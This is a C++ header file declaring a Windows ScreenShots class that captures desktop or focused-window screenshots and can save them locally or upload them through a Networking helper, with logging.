#pragma once
#include <windows.h>
#include <atlimage.h>
#include <string>
#include <iostream>

#include "Utils.h"
#include "Logger.h"
#include "Networking.h"

using namespace std;

class ScreenShots
{
public:

	ScreenShots(string savePath, int monitorAmount, bool saveImage, bool uploadImage, Networking* pnetworking, Logger* plogger);

	void takeDesktopScreenshot();
	void takeFocusedScreenshot();

private:

	void saveImage(string saveName, CImage* image);

	Utils utils;
	Networking* networking;
	Logger* logger;

	string saveDir;
	int monitorCount;
	bool save;
	bool upload;

};